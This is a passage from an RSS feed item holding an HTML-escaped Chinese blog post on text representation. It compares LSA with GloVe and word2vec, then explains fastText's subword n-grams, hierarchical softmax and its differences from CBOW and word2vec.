&lt;p&gt;LSA（Latent Semantic Analysis）是一种比较早的count-based的词向量表征工具，它也是基于co-occurance matrix的，只不过采用了基于奇异值分解（SVD）的矩阵分解技术对大矩阵进行降维，而我们知道SVD的复杂度是很高的，所以它的计算代价比较大。还有一点是它对所有单词的统计权重都是一致的。而这些缺点在GloVe中被一一克服了。而word2vec最大的缺点则是没有充分利用所有的语料，所以GloVe其实是把两者的优点结合了起来。从这篇论文给出的实验结果来看，GloVe的性能是远超LSA和word2vec的，但网上也有人说GloVe和word2vec实际表现其实差不多。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;fasttext&quot;&gt;fastText&lt;/h2&gt;
&lt;ul readability=&quot;-0.93663165028804&quot;&gt;&lt;li&gt;
&lt;p&gt;思想&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;将整篇文档的词及n-gram向量叠加平均得到文档向量，然后使用文档向量做softmax多分类。&lt;/strong&gt;这中间涉及到两个技巧：字符级n-gram特征的引入以及分层Softmax分类。叠加词向量背后的思想就是传统的词袋法，即将文档看成一个由词构成的集合。&lt;/li&gt;
&lt;li&gt;模型的前半部分，即从输入层输入到隐含层输出部分：生成用来表征文档的向量。&lt;strong&gt;叠加构成这篇文档的所有词及n-gram的词向量，然后取平均。&lt;/strong&gt;叠加词向量背后的思想就是传统的词袋法，即将文档看成一个由词构成的集合。&lt;/li&gt;
&lt;li&gt;模型的后半部分，即从隐含层输出到输出层输出部分：是一个softmax线性多类别分类器，分类器的输入是一个用来表征当前文档的向量。&lt;/li&gt;
&lt;li&gt;子词嵌入（subword embedding），使用字符级别的n-grams表示一个单词。
&lt;ul&gt;&lt;li&gt;例子：对于单词“book”，假设n的取值为3，则它的trigram有:&lt;strong&gt;“&amp;lt;bo”, “boo”, “ook”, “ok&amp;gt;”&lt;/strong&gt;其中，&amp;lt;表示前缀，&amp;gt;表示后缀。于是，我们可以用这些trigram来表示“book”这个单词。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;模型结构：与CBOW相似&lt;/p&gt;
&lt;img src=&quot;http://image.wonkers.cn//2019-8-21_20-31-22.jpeg&quot; alt=&quot;img&quot;/&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fastText与CBOW不同点&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;CBOW的输入是目标单词的上下文，fastText的输入是多个单词及其n-gram特征，这些特征用来表示单个文档；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;CBOW的输入单词被one-hot编码过，fastText的输入特征是被embedding过；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;CBOW的输出是目标词汇，fastText的输出是文档对应的类标。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;值得注意的是，fastText在输入时，将单词的字符级别的n-gram向量作为额外的特征；在输出时，fastText采用了分层Softmax，大大降低了模型训练时间。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分类效果&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;用单词的embedding叠加获得的文档向量，词向量的重要特点就是向量的距离可以用来衡量单词间的语义相似程度。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;使用词embedding而非词本身作为特征，这是fastText效果好的一个原因；另一个原因就是字符级n-gram特征的引入对分类效果会有一些提升 。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;fastText与Word2Vec的异同&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;相同点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;图模型结构很像，都是采用embedding向量的形式，得到word的隐向量表达。&lt;/li&gt;
&lt;li&gt;都采用很多相似的优化方法，比如使用Hierarchical softmax优化训练和预测中的打分速度。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不同点&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;层次softmax：CBOW的叶子节点是词和词频，fasttext叶子节点里是类标和类标的频数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118175159028.png&quot; alt=&quot;image-20210118175159028&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;word2vec的目的是得到词向量，该词向量最终是在输入层得到的，输出层对应的h-softmax也会生成一系列的向量，但是最终都被抛弃，不会使用。&lt;/p&gt;
&lt;p&gt;fastText则充分利用了h-softmax的分类功能，遍历分类树的所有叶节点，找到概率最大的label&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码实现&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Mon, 18 Jan 2021 15:41:00 +0000</pubDate>
<dc:creator>知亦行</dc:creator>
<og:description>文本表示 将文本数据表示成计算机能够运算的数字或向量 离散表示 独热编码（One-hot） 思想： 将语料库中所有的词拉成一个向量，给每个词一个下标，就得到对应的词典。每个分词的文本表示为该分词的比特</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wonker/p/14295824.html</dc:identifier>
</item>
</channel>
</rss>